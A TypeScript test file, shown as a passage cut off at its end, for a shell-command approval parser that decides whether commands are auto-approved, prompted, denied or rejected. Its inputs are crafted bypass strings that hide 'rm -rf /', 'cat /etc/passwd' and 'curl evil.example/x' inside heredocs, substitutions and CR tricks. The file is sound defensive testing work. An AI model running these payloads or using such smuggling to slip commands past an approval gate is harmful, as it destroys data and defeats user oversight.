import { containsDangerousSubstitution, getCommandDecision, getCommandDecisionDetailed } from "../commands"

describe("containsDangerousSubstitution", () => {
	describe("zsh array assignments (should NOT be flagged)", () => {
		it("should return false for files=(a b c)", () => {
			expect(containsDangerousSubstitution("files=(a b c)")).toBe(false)
		})

		it("should return false for var=(item1 item2)", () => {
			expect(containsDangerousSubstitution("var=(item1 item2)")).toBe(false)
		})

		it("should return false for x=(hello)", () => {
			expect(containsDangerousSubstitution("x=(hello)")).toBe(false)
		})
	})

	describe("zsh process substitution (should be flagged)", () => {
		it("should return true for standalone =(whoami)", () => {
			expect(containsDangerousSubstitution("=(whoami)")).toBe(true)
		})

		it("should return true for =(ls) with leading space", () => {
			expect(containsDangerousSubstitution(" =(ls)")).toBe(true)
		})

		it("should return true for echo =(cat /etc/passwd)", () => {
			expect(containsDangerousSubstitution("echo =(cat /etc/passwd)")).toBe(true)
		})
	})
})

describe("getCommandDecision", () => {
	it("should auto_approve array assignment command with wildcard allowlist", () => {
		const command = 'files=(a.ts b.ts); for f in "${files[@]}"; do echo "$f"; done'
		const result = getCommandDecision(command, ["*"])
		expect(result).toBe("auto_approve")
	})
})

describe("containsDangerousSubstitution — node -e one-liner false positive regression", () => {
	const nodeOneLiner = `node -e "const fs=require('fs');const p=JSON.parse(fs.readFileSync('prd.json','utf8'));const allowed=new Set(['pending','in-progress','complete','blocked']);const bad=(p.items||[]).filter(i=>!allowed.has(i.status));console.log('meta.status',p.meta?.status);console.log('workstreams', (p.workstreams||[]).length);console.log('items', (p.items||[]).length);console.log('statusCounts', (p.items||[]).reduce((a,i)=>(a[i.status]=(a[i.status]||0)+1,a),{}));console.log('invalidStatuses', bad.length);if(bad.length){console.log(bad.map(i=>i.id+':'+i.status).join('\\\\n'));process.exit(2);} "`

	it("should NOT flag the complex node -e one-liner as dangerous substitution", () => {
		expect(containsDangerousSubstitution(nodeOneLiner)).toBe(false)
	})
})

describe("containsDangerousSubstitution — arrow function patterns (should NOT be flagged)", () => {
	it("should return false for node -e with simple arrow function", () => {
		expect(containsDangerousSubstitution(`node -e "const a=(b)=>b"`)).toBe(false)
	})

	it("should return false for node -e with spaced arrow function", () => {
		expect(containsDangerousSubstitution(`node -e "const fn = (x) => x * 2"`)).toBe(false)
	})

	it("should return false for node -e with arrow function in method chain", () => {
		expect(containsDangerousSubstitution(`node -e "arr.filter(i=>!set.has(i))"`)).toBe(false)
	})
})

describe("containsDangerousSubstitution — true positives still caught", () => {
	it("should flag dangerous parameter expansion ${var@P}", () => {
		expect(containsDangerousSubstitution('echo "${var@P}"')).toBe(true)
	})

	it("should flag here-string with command substitution <<<$(…)", () => {
		expect(containsDangerousSubstitution("cat <<<$(whoami)")).toBe(true)
	})

	it("should flag indirect variable reference ${!var}", () => {
		expect(containsDangerousSubstitution("echo ${!prefix}")).toBe(true)
	})

	it("should flag zsh process substitution =(…) at start of token", () => {
		expect(containsDangerousSubstitution("echo =(cat /etc/passwd)")).toBe(true)
	})

	it("should flag zsh glob qualifier with code execution", () => {
		expect(containsDangerousSubstitution("ls *(e:whoami:)")).toBe(true)
	})
})

describe("getCommandDecision — integration with dangerous substitution checks", () => {
	const allowedCommands = ["node", "echo"]

	it("should auto-approve the complex node -e one-liner when node is allowed", () => {
		const nodeOneLiner = `node -e "const fs=require('fs');const p=JSON.parse(fs.readFileSync('prd.json','utf8'));const allowed=new Set(['pending','in-progress','complete','blocked']);const bad=(p.items||[]).filter(i=>!allowed.has(i.status));console.log('meta.status',p.meta?.status);console.log('workstreams', (p.workstreams||[]).length);console.log('items', (p.items||[]).length);console.log('statusCounts', (p.items||[]).reduce((a,i)=>(a[i.status]=(a[i.status]||0)+1,a),{}));console.log('invalidStatuses', bad.length);if(bad.length){console.log(bad.map(i=>i.id+':'+i.status).join('\\\\n'));process.exit(2);} "`

		expect(getCommandDecision(nodeOneLiner, allowedCommands)).toBe("auto_approve")
	})

	it("should ask user for echo $(whoami) because subshell whoami is not in the allowlist", () => {
		expect(getCommandDecision("echo $(whoami)", allowedCommands)).toBe("ask_user")
	})

	it("should ask user for dangerous parameter expansion even when command is allowed", () => {
		expect(getCommandDecision('echo "${var@P}"', allowedCommands)).toBe("ask_user")
	})

	it("does not auto-approve a substitution embedded in a parameter expansion", () => {
		// The shell runs $(rm -rf ~/work) when x is unset. The inner command must
		// therefore match the lists on its own. Allowing `echo` must not approve
		// the payload.
		expect(getCommandDecision("echo ${x:-$(rm -rf ~/work)}", ["echo"])).toBe("ask_user")
	})

	it("does not auto-approve a process substitution embedded in a parameter expansion", () => {
		// With x unset, bash expands the alternate word and runs `rm a`. bash
		// substitutes a device path for it. The inner command must match the
		// lists on its own. Allowing `echo` must not approve the payload.
		expect(getCommandDecision("echo ${x:-<(rm a)}", ["echo"])).toBe("ask_user")
	})

	it("does not auto-approve a nested substitution riding outer allowlist entries", () => {
		// `$(foo $(rm -rf /) bar)` must decompose so that the innermost
		// `rm -rf /` is evaluated on its own. A cut at the first ")" would let
		// the payload share the allowlist match of the `foo` and `bar` entries.
		expect(getCommandDecision("ls $(foo $(rm -rf /) bar)", ["ls", "foo", "bar"])).toBe("ask_user")
	})

	it("asks user when a heredoc opened inside a parameter expansion carries a substitution", () => {
		// With x unset, bash expands the alternate word. That runs the heredoc
		// body's $(evil), even though the expansion itself stays one segment.
		expect(getCommandDecision("cat ${x:-y <<EOF\n$(evil)\nEOF\n}", ["cat"])).toBe("ask_user")
	})

	it("fails closed on a NUL byte gluing a substitution to an allowed command", () => {
		// bash drops the NUL and runs the glued substitution. The placeholder
		// degradation must not leave `git status$(whoami)` looking like one
		// allowed word. The parser rejects the input as malformed instead.
		expect(getCommandDecision("git status\x00$(whoami)", ["git"])).toBe("malformed_command")
	})

	it("asks user for a substitution on the heredoc opener line after the delimiter", () => {
		// The shell expands the opener line's remainder even when the delimiter
		// is quoted. The $(whoami) there therefore matches the lists on its own.
		expect(getCommandDecision("cat <<EOF $(whoami)\nbody\nEOF", ["cat"])).toBe("ask_user")
	})

	it("does not auto-approve a denied command chained after a heredoc delimiter", () => {
		// bash pipes the heredoc into `rm x`: the text after the delimiter word
		// is live syntax, so `rm` must match the denylist on its own instead of
		// riding the heredoc head's allowlist match.
		expect(getCommandDecision("echo $(cat <<E | rm x\nhi\nE\n)", ["cat", "echo"], ["rm"])).toBe("auto_deny")
		// The same rejection at the top level, without the surrounding expansion.
		expect(getCommandDecision("cat <<E | rm x\nhi\nE", ["cat", "echo"], ["rm"])).toBe("auto_deny")
		// An unlisted right-hand command costs a prompt, never an approval.
		expect(getCommandDecision("echo $(cat <<E | grep x\nhi\nE\n)", ["cat", "echo"], [])).toBe("ask_user")
	})

	it("does not auto-approve a denied command after a mid-word # in the opener remainder", () => {
		// bash treats the `#` inside `f#g` as an ordinary character and still
		// pipes into `rm x`. The remainder masking keeps the tail visible to
		// the lists instead of letting a comment swallow it.
		expect(getCommandDecision("echo $(cat <<E f#g | rm x\nhi\nE\n)", ["cat", "echo"], ["rm"])).toBe("auto_deny")
	})

	it("does not auto-approve a denied command glued to the heredoc delimiter", () => {
		// bash ends the delimiter word at `|`, so the body never terminates and
		// `rm x` runs live. The parser cannot account for the construct and
		// reports it malformed, which costs a rejection, never an approval.
		expect(getCommandDecision("echo $(cat <<E|rm x\nhi\nE|rm\n)", ["cat", "echo"], ["rm"])).toBe(
			"malformed_command",
		)
	})

	it("auto-approves a heredoc pipeline whose every stage is allowlisted (no over-reject)", () => {
		// A split the denylist never sees must not over-fire: an operator-free
		// opener and an all-allowlisted right-hand command both stay approved.
		expect(getCommandDecision("echo $(cat <<E\nhi\nE\n)", ["cat", "echo"], [])).toBe("auto_approve")
		expect(getCommandDecision("echo $(cat <<E | grep x\nhi\nE\n)", ["cat", "echo", "grep"], [])).toBe(
			"auto_approve",
		)
	})

	it("denies a command chained after a # glued to a substitution closer", () => {
		// bash keeps `$(ls)#x` as one word, so the chained `rm y` executes.
		// The closer-aware remainder keeps it visible to the denylist instead
		// of swallowing the tail as comment text.
		expect(getCommandDecision("echo $(cat <<E $(ls)#x ; rm y\nhi\nE\n)", ["cat", "echo", "ls"], ["rm"])).toBe(
			"auto_deny",
		)
	})

	it("denies a command chained after a # glued to a process-substitution closer", () => {
		// `<(...)` continues the word exactly like `$(...)`.
		expect(getCommandDecision("echo $(cat <<E <(ls)#x ; rm y\nhi\nE\n)", ["cat", "echo", "ls"], ["rm"])).toBe(
			"auto_deny",
		)
	})

	it("denies a command glued directly after a # that follows a substitution closer", () => {
		// The operator needs no blanks: bash still runs `rm y`, so the denylist
		// must see it.
		expect(getCommandDecision("echo $(cat <<E $(ls)#x|rm y\nhi\nE\n)", ["cat", "echo", "ls"], ["rm"])).toBe(
			"auto_deny",
		)
	})

	it("rejects a delimiter glued to a subshell paren instead of approving it", () => {
		// bash refuses `cat <<E(rm x)` as a syntax error. The parser must fail
		// the construct closed like the base parser, never approve input whose
		// parenthesized remainder hides commands from the lists.
		expect(getCommandDecision("cat <<E(rm x)\nhi\nE", ["cat", "echo"], ["rm"])).toBe("malformed_command")
	})

	it("fails closed on a word-start pipe with no delimiter word", () => {
		// bash reads `|` as the operator token where the delimiter word
		// belongs and rejects the command outright. The no-word mask must not
		// turn that syntax error into an approved opaque word. The deny head
		// never reaches the lists: the whole command is rejected.
		expect(getCommandDecision("cat <<|rm x\nhi\nE", ["cat", "echo", "ls"], ["rm"])).toBe("malformed_command")
	})

	it("fails closed on a word-start paren with no delimiter word", () => {
		// `(` is the same operator-token shape as the pipe: bash rejects the
		// command before executing anything, so the mask must not approve it.
		expect(getCommandDecision("cat <<(x)\nhi\nE", ["cat", "echo", "ls"], ["rm"])).toBe("malformed_command")
	})

	it("denies a command chained after a # riding a group-frame closer", () => {
		// bash balances the `(ls)` group before the `$( … )` closer, so the
		// glued `#` continues the word and `rm y` really executes. It must
		// reach the denylist as its own segment instead of being swallowed as
		// comment text by a frame that popped at the group's closer.
		expect(getCommandDecision("cat <<E $( (ls) )#x ; rm y\nhi\nE", ["cat", "echo", "ls"], ["rm"])).toBe("auto_deny")
	})

	it("auto-approves the blanks-only no-word mask (posture control)", () => {
		// `<<` followed only by blanks before end of line is the shape the
		// no-word mask is the accepted policy for: bash never executes it, so
		// the mask's approval is not a policy over-approximation gap.
		expect(getCommandDecision("cat << \nEOF\nrm -rf /\n", ["cat", "echo", "ls"], ["rm"])).toBe("auto_approve")
	})

	it("auto-approves a word-initial comment after a spaced substitution closer", () => {
		// A blank before the `#` is a real word start: bash starts a comment
		// there and never runs the tail, so approval stays bash-faithful.
		expect(getCommandDecision("echo $(cat <<E $(ls) #x ; rm y\nhi\nE\n)", ["cat", "echo", "ls"], ["rm"])).toBe(
			"auto_approve",
		)
	})

	it("asks user when a heredoc body with an unquoted delimiter contains a substitution", () => {
		// The shell expands $(whoami) inside an unquoted-delimiter heredoc body.
		// The inner command must therefore match the lists, even though the
		// heredoc is one host segment.
		const heredoc = "cat <<EOF\n$(whoami)\nEOF"
		expect(getCommandDecision(heredoc, ["cat"])).toBe("ask_user")
	})

	it("asks user for a substitution inside the deprecated $[…] arithmetic form", () => {
		// bash expands `$[ … ]` interiors before it evaluates them. `touch` must
		// therefore match the lists on its own. It must not share the allowlist
		// match of `echo`.
		expect(getCommandDecision("echo $[1+$(touch /tmp/pwn; echo 1)]", ["echo"])).toBe("ask_user")
	})

	it("asks user for the line after a double-quoted-delimiter heredoc whose backslash bash keeps", () => {
		// bash keeps `\` before `q`. The heredoc therefore ends at the `a\q`
		// line, and `rm -rf /` is an ordinary following command the lists must
		// see.
		expect(getCommandDecision('cat <<"a\\q"\na\\q\nrm -rf /\naq\n', ["cat"])).toBe("ask_user")
	})

	it("asks user for the line after a heredoc whose terminator bash joins from continued lines", () => {
		// `EO\` plus `F` joins into the `EOF` terminator before bash matches
		// it. `rm -rf /` therefore runs as a following command. It is not
		// masked body text.
		expect(getCommandDecision("cat <<EOF\nEO\\\nF\nrm -rf /\n", ["cat"])).toBe("ask_user")
	})

	it("asks user when a <<- tabbed continuation pair does not join into the terminator", () => {
		// Tabs join before stripping, so `\tEO\` plus `\tF` stays `EO\tF`. The
		// heredoc runs to the real `EOF` line, and `rm -rf /` follows it as a
		// live command. An allowlisted `cat` must not carry that command.
		expect(getCommandDecision("cat <<-EOF\n\tEO\\\n\tF\ncat <<X\nEOF\nrm -rf /\nX\n", ["cat"])).toBe("ask_user")
	})

	it("fails closed on a CRLF heredoc whose backslash-CRLF pair only the msys read layer joins", () => {
		// The msys/Cygwin read layer is the reference shell on the Windows
		// target. It strips the CR from every line it reads. The line therefore
		// ends with the lone backslash and continues. `EO\` plus `F` joins into
		// the terminator, and the commands after it are live. POSIX bash reads
		// `\<CR>` as an escaped CR and joins nothing, so the two models close
		// on different lines. A join that consumes a CRLF makes the boundary
		// model-dependent, and the parser rejects the input as malformed.
		expect(getCommandDecision("cat <<EOF\r\nEO\\\r\nF\r\ntouch x\r\nEOF\r\n", ["cat"])).toBe("malformed_command")
	})

	it("never auto-approves the command a bare-CR heredoc terminator candidate exposes", () => {
		// The msys read layer strips the bare CR. The body line then arrives as
		// the terminator `EOF`, and `curl evil` would run live after it. POSIX
		// bash keeps the CR and masks that line. A CR inside a scanned body
		// line makes the mask boundary model-dependent. The parser therefore
		// rejects the whole input as malformed. The cost is a prompt or a
		// rejection, never an approval.
		expect(getCommandDecision("cat <<EOF\nEO\rF\ncurl evil.example/x\nEOF\ncat ok", ["cat"])).toBe(
			"malformed_command",
		)
	})

	it("never auto-approves a bare-CR early close that re-exposes a masking heredoc opener", () => {
		// The msys model closes the first heredoc at `EO<CR>F`. The scanner
		// would then read the body line `cat <<X` as a live opener whose body
		// masks `rm -rf /`. That decomposition is unaccountable. An
		// allowlisted `cat` must never carry it to execution.
		expect(getCommandDecision("cat <<EOF\nEO\rF\ncat <<X\nEOF\nrm -rf /\nX\n", ["cat"], [])).not.toBe(
			"auto_approve",
		)
		expect(getCommandDecision("cat <<EOF\nEO\rF\ncat <<X\nEOF\nrm -rf /\nX\n", ["cat"], [])).toBe(
			"malformed_command",
		)
	})

	it("never auto-approves a CRLF-joined late close that masks a POSIX-executed command", () => {
		// The msys join of `x\` plus the CRLF keeps the heredoc open past the
		// line where POSIX bash ends it. There the delimiter word is `EOF<CR>`,
		// and bash executes the line that msys masks. The two models diverge,
		// so the input must cost a rejection. It must not auto-approve one
		// masked `cat` command.
		expect(getCommandDecision("cat <<EOF\r\nx\\\r\nEOF\r\nrm -rf /\r\nEOF\r\n", ["cat"], [])).not.toBe(
			"auto_approve",
		)
		expect(getCommandDecision("cat <<EOF\r\nx\\\r\nEOF\r\nrm -rf /\r\nEOF\r\n", ["cat"], [])).toBe(
			"malformed_command",
		)
	})

	it("never auto-approves a CR-free body whose CRLF opener line splits the delimiter word", () => {
		// The opener line's CRLF leaves msys reading the delimiter as `EOF`
		// while POSIX bash reads `EOF<CR>`. The CR-free `EOF` line then closes
		// the heredoc for msys only. The following `cat <<X` opener masks
		// `rm -rf /` under that model. An allowlisted `cat` must never carry
		// that decomposition to execution.
		expect(getCommandDecision("cat <<EOF\r\nbody\nEOF\ncat <<X\nrm -rf /\nX\n", ["cat"], [])).not.toBe(
			"auto_approve",
		)
		expect(getCommandDecision("cat <<EOF\r\nbody\nEOF\ncat <<X\nrm -rf /\nX\n", ["cat"], [])).toBe(
			"malformed_command",
		)
	})

	it("never auto-approves the masking heredoc exposed by a CRLF-terminated terminator line", () => {
		// With an LF opener, both models read the delimiter as `EOF`. The CR on
		// the terminator candidate is ordinary content for POSIX bash. The msys
		// read layer strips that CR and closes the body there. That re-exposes
		// `cat <<X` as a live opener masking `rm -rf /`. The divergence must
		// cost a rejection, never an approval.
		expect(getCommandDecision("cat <<EOF\nEOF\r\ncat <<X\nEOF\nrm -rf /\nX\n", ["cat"], [])).not.toBe(
			"auto_approve",
		)
		expect(getCommandDecision("cat <<EOF\nEOF\r\ncat <<X\nEOF\nrm -rf /\nX\n", ["cat"], [])).toBe(
			"malformed_command",
		)
	})

	it("asks user for the inner commands of process substitutions", () => {
		expect(getCommandDecision("diff <(sort a) <(sort b)", ["diff"])).toBe("ask_user")
	})

	it("auto-approves an unbalanced delimiter inside single quotes", () => {
		// A shell never parses delimiter characters inside single quotes, so an
		// unbalanced "$(" there is ordinary argument text, not a syntax error.
		expect(getCommandDecision("echo 'a $(b'", ["echo"])).toBe("auto_approve")
	})

	it("fails closed on an unmatched closer even when the first word is allowed", () => {
		// A "}" with no matching "{" leaves the parser unable to account for
		// the structure. The decision stays a rejection. An allowlisted first
		// word must not carry it straight to execution.
		expect(getCommandDecision("echo }", ["echo"])).toBe("malformed_command")
		// bash reads "<<" inside "${...}" as an arithmetic shift. It runs
		// "evil" and "E" as command lines, and refuses the trailing "}".
		// Treating the "<<" as a heredoc opener would mask those lines and
		// auto-approve the whole command. The closed frame rejects it instead.
		const shift = "echo ${x:1<<E }\nevil\nE\n}"
		expect(getCommandDecision(shift, ["echo"], [])).toBe("malformed_command")
		expect(getCommandDecision(shift, ["echo", "evil", "E"], [])).toBe("malformed_command")
	})

	it("routes words with balanced braces or a bare closer through the normal approval flow", () => {
		// bash runs all three commands. `find -exec {} \;` is a placeholder,
		// `src/{a,b}` is brace expansion, and a depth-0 ")" cannot hide a
		// substitution. None is malformed, so the allowlisted first word
		// decides.
		expect(getCommandDecision("find . -exec rm {} \\;", ["find"], [])).toBe("auto_approve")
		expect(getCommandDecision("mkdir -p src/{a,b}", ["mkdir"], [])).toBe("auto_approve")
		expect(getCommandDecision("git show HEAD@{1}", ["git"], [])).toBe("auto_approve")
		expect(getCommandDecision("echo )", ["echo"], [])).toBe("auto_approve")
	})

	it("fails closed on an unclosed arithmetic opener even when the first word is allowed", () => {
		// bash refuses an unclosed "$((" . The masked remainder must not let
		// the allowlisted "echo" carry a never-closed "$(" straight to
		// execution.
		expect(getCommandDecision("echo $(( $(evil)", ["echo"])).toBe("malformed_command")
	})

	it("fails closed on a CR-only heredoc opener even when the first word is allowed", () => {
		// A lone CR does not terminate the opener line, so the heredoc is
		// unterminated. The input must not look well-formed to the allowlists.
		expect(getCommandDecision("cat <<EOF\r$(evil)\rEOF", ["cat"])).toBe("malformed_command")
	})

	it("fails closed on a CR immediately after a bare-<< opener", () => {
		// A lone CR is not a line terminator for bash, so the opener line never
		// ends. The parser reports the heredoc as unterminated. The allowlisted
		// `cat` must not carry the masked remainder.
		expect(getCommandDecision("cat <<\rEOF\nEOF\nrm -rf /\n", ["cat"], [])).toBe("malformed_command")
	})

	it("fails closed on a bare-<< heredoc whose opener line ends CRLF", () => {
		// The CR inside the masked span leaves the msys and POSIX read layers
		// reading different bytes. The mask cannot then be verified in a
		// model-independent way, so it fails closed. The decision is a
		// rejection, never the approval an opaque `cat` word would otherwise
		// earn.
		expect(getCommandDecision("cat << \r\nEOF\n\r\nrm -rf /\n", ["cat"], [])).not.toBe("auto_approve")
		expect(getCommandDecision("cat << \r\nEOF\n\r\nrm -rf /\n", ["cat"], [])).toBe("malformed_command")
	})

	it("fails closed on a bare-<< heredoc whose CR rides against the opener", () => {
		// This is the same decision-level rejection with the CR directly after
		// `<<`. One CR byte inside the masked region is enough to fail the
		// heredoc closed.
		expect(getCommandDecision("cat <<\r\nEOF\nrm -rf /\n", ["cat"], [])).not.toBe("auto_approve")
		expect(getCommandDecision("cat <<\r\nEOF\nrm -rf /\n", ["cat"], [])).toBe("malformed_command")
	})

	it("auto-approves a CR-free bare-<< heredoc (no over-fire)", () => {
		// The masked span here is byte-identical under both read layers. The
		// accepted masking policy for this never-runnable shape is therefore
		// unchanged. A CR-free bare-<< opener still masks through end of input
		// and stays approved under an allowlisted `cat`.
		expect(getCommandDecision("cat <<\nEOF\nrm -rf /\n", ["cat"], [])).toBe("auto_approve")
	})

	it("asks user when a quoted-empty heredoc delimiter lets a later command escape", () => {
		// bash's quote removal makes `<<''` terminate at the first blank line,
		// so `rm -rf /` really executes as its own command. Now that the parser
		// splits it out, the unallowed segment costs a prompt. It must not
		// share the allowlist match of `cat`.
		expect(getCommandDecision("cat <<''\nbody\n\nrm -rf /", ["cat"])).toBe("ask_user")
	})

	it("fails closed on an unclosed delimiter quote hiding an executable tail", () => {
		// bash carries the open quote across the newline and runs `; rm -rf /`
		// as a separate command. The parser rejects the input as malformed, so
		// no partial decomposition can auto-approve it.
		expect(getCommandDecision("cat <<'X\r\n'; rm -rf /\nX\r\n", ["cat"])).toBe("malformed_command")
	})

	it("does not approve a deny command joined onto the opener line by a backslash", () => {
		// `'a'` closes before the trailing backslash, so bash joins the body's
		// `; rm -rf /` line onto the opener line as live syntax the remainder
		// cut never sees. The heredoc fails closed, and the deny payload never
		// reaches tokenization: an allowlisted `cat` must not carry it.
		expect(getCommandDecision("cat <<E 'a'\\\n; rm -rf /\nE\n", ["cat"], [])).not.toBe("auto_approve")
		expect(getCommandDecision("cat <<E 'a'\\\n; rm -rf /\nE\n", ["cat"], ["rm"])).toBe("malformed_command")
	})

	it("fails closed on deny commands joined by backslash runs the remainder quote walk must track", () => {
		// Two more crafted joins reach the same decision through different walk
		// branches. `\'` keeps the `'` escaped, so the run there is unquoted;
		// `"a\"b'` ends with an open single quote that the double-quote branch
		// must step over. Both joins must fail closed before the deny payload
		// tokenizes. `"a"b'` additionally pins the accept side: an open single
		// quote at the run keeps the guard silent, and a walk that loses that
		// state rejects this ordinary heredoc instead of approving it.
		expect(getCommandDecision("cat <<E a\\'\\\n; rm -rf /\nE\n", ["cat"], [])).not.toBe("auto_approve")
		expect(getCommandDecision("cat <<E a\\'\\\n; rm -rf /\nE\n", ["cat"], ["rm"])).toBe("malformed_command")
		expect(getCommandDecision('cat <<E "a\\"b\'\\\n; rm -rf /\nE\n', ["cat"], [])).not.toBe("auto_approve")
		expect(getCommandDecision('cat <<E "a\\"b\'\\\n; rm -rf /\nE\n', ["cat"], ["rm"])).toBe("malformed_command")
		expect(getCommandDecision('cat <<E "a"b\'\\\n; rm -rf /\nE\n', ["cat"], [])).toBe("auto_approve")
	})

	it("decides opener-remainder quote, procsub-chain, and redirect shapes by their decomposition", () => {
		// Decision-layer mirror of the remainder-walk pins: a quote region
		// only closes on its own character, so the cross-quoted remainders
		// drop the `#c` tail inside the still-open region and leave a
		// heredoc whose every command is allowlisted; the closer-boundary
		// shapes keep `#c` as word content and stay approved; a `>(…)`
		// chain makes its payloads match the lists on their own, so an
		// unlisted payload costs a prompt; and a plain `>`/`<` redirect
		// stays host text that never masks a command from the lists.
		expect(getCommandDecision("cat <<E \"a'b'#c\nbody\nE\n", ["cat"], ["rm"])).toBe("auto_approve")
		expect(getCommandDecision('cat <<E \'a"b"#c\nbody\nE\n', ["cat"], ["rm"])).toBe("auto_approve")
		expect(getCommandDecision('cat <<E "a\'b"#c\nbody\nE\n', ["cat"], ["rm"])).toBe("auto_approve")
		expect(getCommandDecision("cat <<E 'a\"b'#c\nbody\nE\n", ["cat"], ["rm"])).toBe("auto_approve")
		expect(getCommandDecision("cat <<E >(a)>(b)#c\nbody\nE\n", ["cat"], [])).toBe("ask_user")
		expect(getCommandDecision("cat <<E >out\nbody\nE\n", ["cat"], ["rm"])).toBe("auto_approve")
		expect(getCommandDecision("cat <<E <in\nbody\nE\n", ["cat"], ["rm"])).toBe("auto_approve")
	})

	it("decides a # riding an inner frame closer by the comment bash starts at it", () => {
		// While an outer frame stays open, a `#` at an inner closer is frame
		// content and bash comments the `; rm -rf /]d` tail, so an allowlisted
		// head carries nothing the deny list names. Marking the closer at the
		// inner pop instead keeps " #c" in the host and fabricates
		// "rm -rf /]d" as its own segment, flipping the decision to a deny.
		// The counterpart with the `#` at the pop that empties the frames
		// keeps `rm -rf /` live, so it must cost the deny and the prompt.
		expect(getCommandDecision("cat <<E $[a$(b)#c; rm -rf /]d\nbody\nE\n", ["cat", "b"], ["rm"])).toBe(
			"auto_approve",
		)
		expect(getCommandDecision("cat <<E $[a$(b)#c; rm -rf /]d\nbody\nE\n", ["cat", "b"], [])).toBe("auto_approve")
		expect(getCommandDecision("cat <<E $[a$(b)]#c; rm -rf /\nbody\nE\n", ["cat", "b"], ["rm"])).toBe("auto_deny")
		expect(getCommandDecision("cat <<E $[a$(b)]#c; rm -rf /\nbody\nE\n", ["cat", "b"], [])).toBe("ask_user")
	})

	it("does not reject a subshell group inside a command substitution as malformed", () => {
		// `$( (echo safe) )` is ordinary syntax that bash runs. A top-level
		// bare `(` stays host grouping, as segmentation worked before this
		// change. The extracted group starts with `(`, so it matches neither
		// list and the decision is `ask_user`, never `malformed_command`.
		expect(getCommandDecision("$( (echo safe) )", ["echo"])).toBe("ask_user")
	})

	it("does not auto-approve the group of a mis-nested $(( … ) … )", () => {
		// bash runs the group inside `echo $((rm -rf /) )`, so the group must
		// be checked on its own instead of riding the allowlisted `echo`.
		// The extracted group starts with `(`, so neither list prefix matches
		// it; the decision is `ask_user`, never `auto_approve`.
		expect(getCommandDecision("echo $((rm -rf /) )", ["echo"], ["rm"])).toBe("ask_user")
		expect(getCommandDecision("echo $((rm -rf /) )", ["echo"], [])).toBe("ask_user")
	})

	it("asks user for the payload of a >() process substitution", () => {
		// bash runs the inner command unconditionally. Its output becomes the
		// device file that the outer command writes to. `evil` is therefore
		// evaluated against the lists on its own, even though the outer `cat`
		// is allowed.
		expect(getCommandDecision("cat >(evil)", ["cat"])).toBe("ask_user")
	})

	it("auto-approves a well-formed mid-word-quoted delimiter (no over-fire)", () => {
		// `<<EOF'x'` closes its quote before the line end. After bash's quote
		// removal, the terminator is the literal word EOFx. This stays a single
		// ordinary heredoc that an allowlisted `cat` may run.
		expect(getCommandDecision("cat <<EOF'x'\nbody\nEOFx\n", ["cat"])).toBe("auto_approve")
	})

	it("does not auto-approve a heredoc-body frame tail riding a mis-sliced group prefix", () => {
		// bash runs `curl evil` from this body line. An allowlist that covers
		// the host and the quoted-quote group prefix must not carry the tail.
		// The frame keeps its full payload, `curl evil` is its own segment, and
		// no segment matches. The decision is a prompt, never an approval.
		expect(getCommandDecision('cat <<EOF\n$( (echo ")") ; curl evil)\nEOF', ["cat", "( echo"])).toBe("ask_user")
	})

	it("does not auto-approve the single-quoted variant of a heredoc-body frame tail", () => {
		expect(getCommandDecision("cat <<EOF\n$( (echo ')') ; curl evil)\nEOF", ["cat", "( echo"])).toBe("ask_user")
	})

	it("does not auto-approve a heredoc-body frame tail hidden behind a comment", () => {
		// bash skips the comment to end of line. Its `)` therefore never closes
		// the frame, and `curl evil` really executes inside the same
		// substitution. An allowlist that covers the host and the first inner
		// command must not carry the tail. The tail is its own segment and
		// costs a prompt.
		expect(getCommandDecision("cat <<EOF\n$( echo ok # )\ncurl evil)\nEOF", ["cat", "echo"])).toBe("ask_user")
	})

	it("does not auto-approve the CRLF variant of a comment-hidden frame tail", () => {
		// msys strips every CR while POSIX keeps it. The CRs here leave the two
		// read layers on different bytes, so the close cannot be verified in a
		// model-independent way. The parser fails the heredoc closed even
		// though the models for this uniformly-CRLF input happen to agree. The
		// decision is a rejection rather than the LF variant's prompt. Neither
		// case is an approval.
		expect(getCommandDecision("cat <<EOF\r\n$( echo ok # )\r\ncurl evil)\r\nEOF\r\n", ["cat", "echo"])).toBe(
			"malformed_command",
		)
	})

	it("does not auto-approve a frame tail behind a comment at the frame start", () => {
		expect(getCommandDecision("cat <<EOF\n$(# ok )\ncurl evil)\nEOF", ["cat"])).toBe("ask_user")
	})

	it("fails closed when a frame comment swallows the frame's only closer", () => {
		// bash refuses the input outright with an unterminated-command-
		// substitution error, so no partial decomposition may carry an
		// approval.
		expect(getCommandDecision("cat <<EOF\n$( echo # )\nEOF", ["cat", "echo"])).toBe("malformed_command")
	})

	it("asks user for a mid-word # argument whose separator hides an unallowed tail", () => {
		// `x=a#b` is one bash argument, because a comment starts only at a word
		// boundary. The tail after `;` runs separately. It must not share the
		// allowlist match of `echo`.
		expect(getCommandDecision("cat <<EOF\n$( echo x=a#b ; curl evil )\nEOF", ["cat", "echo"])).toBe("ask_user")
	})

	it("does not auto-approve a frame tail after a quoted # region", () => {
		// The `#` inside the quotes is literal. The frame therefore keeps its
		// full payload, and `curl evil` splits out as an unallowed segment.
		expect(getCommandDecision('cat <<EOF\n$( echo "a # b" ; curl evil)\nEOF', ["cat", "echo"])).toBe("ask_user")
	})

	it("does not auto-approve a tail riding after a # at a word-embedded expansion closer", () => {
		// bash ends the expansion at `)` but not the word. The adjacent `#` is
		// therefore word content, and `; curl evil` is a second executed
		// command. An allowlist that covers the host and the substitution must
		// not carry the tail. The tail is its own segment and costs a prompt.
		expect(getCommandDecision("echo x=$(echo ok)#;curl evil", ["echo"])).toBe("ask_user")
		expect(getCommandDecision("echo $((1))#;curl evil", ["echo"])).toBe("ask_user")
		expect(getCommandDecision("echo x=`echo ok`#;curl evil", ["echo"])).toBe("ask_user")
		expect(getCommandDecision("cat <(echo ok)#;curl evil", ["cat", "echo"])).toBe("ask_user")
	})

	it("does not auto-approve a tail riding after a # at the end of an escape pair", () => {
		// bash treats an escaped character as word content. The `#` directly
		// after the `\c` pair therefore never starts a comment, and
		// `; curl evil` really executes. Each tail must cost a prompt, despite
		// the `echo` allowlist. A real space before the `#` puts it at a word
		// start instead. There bash comments the line, and the same shape stays
		// approved.
		expect(getCommandDecision("echo a\\)#;curl evil", ["echo"])).toBe("ask_user")
		expect(getCommandDecision("echo a\\;#;curl evil", ["echo"])).toBe("ask_user")
		expect(getCommandDecision("echo a\\ #;curl evil", ["echo"])).toBe("ask_user")
		expect(getCommandDecision("echo a\\) #c;curl evil", ["echo"])).toBe("auto_approve")
	})
})

describe("getCommandDecision — multi-line script wrapped in a quoted argument", () => {
	// A wrapper command (e.g. sh -c '...') carrying a multi-line script as a
